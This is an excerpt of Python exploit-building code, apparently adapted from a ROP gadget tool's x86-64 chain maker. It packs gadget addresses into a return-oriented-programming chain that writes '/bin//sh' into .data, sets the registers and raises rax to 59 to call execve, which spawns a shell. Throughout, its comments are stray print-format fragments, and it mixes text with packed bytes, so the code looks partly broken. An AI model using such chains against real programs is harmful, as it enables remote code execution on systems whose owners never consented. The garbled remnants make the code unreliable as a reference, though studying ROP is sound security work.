...
class ROPMakerX64:
    ...
    def __padding(self, gadget, regAlreadSetted):
        ...
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    padding_code += pack('<Q', regAlreadSetted[reg]) # padding without overwrite %s\n" % (regAlreadSetted[reg], reg)
                except KeyError:
                    padding_code += pack('<Q', 0x4141414141414141) # padding\n"
        return padding_code
    ...
    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):
        ...
        godgets_in_stack += pack('<Q', popDst["vaddr"]) # %s\n" % (popDst["vaddr"], popDst["gadget"])
        godgets_in_stack += pack('<Q', dataAddr) # @ .data\n" % dataAddr
        godgets_in_stack += self.__padding(popDst, {})

        godgets_in_stack += pack('<Q', popSrc["vaddr"]) # %s\n" % (popSrc["vaddr"], popSrc["gadget"])
        godgets_in_stack += '/bin//sh'
        godgets_in_stack += self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        godgets_in_stack += pack('<Q', write4where["vaddr"]) # %s\n" % (write4where["vaddr"], write4where["gadget"])
        godgets_in_stack += self.__padding(write4where, {})

        godgets_in_stack += pack('<Q', popDst["vaddr"]) # %s\n" % (popDst["vaddr"], popDst["gadget"])
        godgets_in_stack += pack('<Q', (dataAddr + 8)) # @ .data + 8\n" % (dataAddr + 8)
        godgets_in_stack += self.__padding(popDst, {})

        godgets_in_stack += pack('<Q', xorSrc["vaddr"]) # %s\n" % (xorSrc["vaddr"], xorSrc["gadget"])
        godgets_in_stack += self.__padding(xorSrc, {})

        godgets_in_stack += pack('<Q', write4where["vaddr"]) # %s\n" % (write4where["vaddr"], write4where["gadget"])
        godgets_in_stack += self.__padding(write4where, {})

        godgets_in_stack += pack('<Q', popRdi["vaddr"]) # %s\n" % (popRdi["vaddr"], popRdi["gadget"])
        godgets_in_stack += pack('<Q', dataAddr) # @ .data\n" % dataAddr
        godgets_in_stack += self.__padding(popRdi, {})

        godgets_in_stack += pack('<Q', popRsi["vaddr"]) # %s\n" % (popRsi["vaddr"], popRsi["gadget"])
        godgets_in_stack += pack('<Q', (dataAddr + 8)) # @ .data + 8\n" % (dataAddr + 8)
        godgets_in_stack += self.__padding(popRsi, {"rdi": dataAddr})  # Don't overwrite rdi

        godgets_in_stack += pack('<Q', popRdx["vaddr"]) # %s\n" % (popRdx["vaddr"], popRdx["gadget"])
        godgets_in_stack += pack('<Q', (dataAddr + 8)) # @ .data + 8\n" % (dataAddr + 8)
        godgets_in_stack += self.__padding(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        godgets_in_stack += pack('<Q', xorRax["vaddr"]) # %s\n" % (xorRax["vaddr"], xorRax["gadget"])
        godgets_in_stack += self.__padding(xorRax, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        for i in range(59):
            godgets_in_stack += pack('<Q', incRax["vaddr"]) # %s\n" % (incRax["vaddr"], incRax["gadget"])
            godgets_in_stack += self.__padding(incRax,
                                           {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        godgets_in_stack += pack('<Q', syscall["vaddr"]) # %s\n" % (syscall["vaddr"], syscall["gadget"])
        return godgets_in_stack
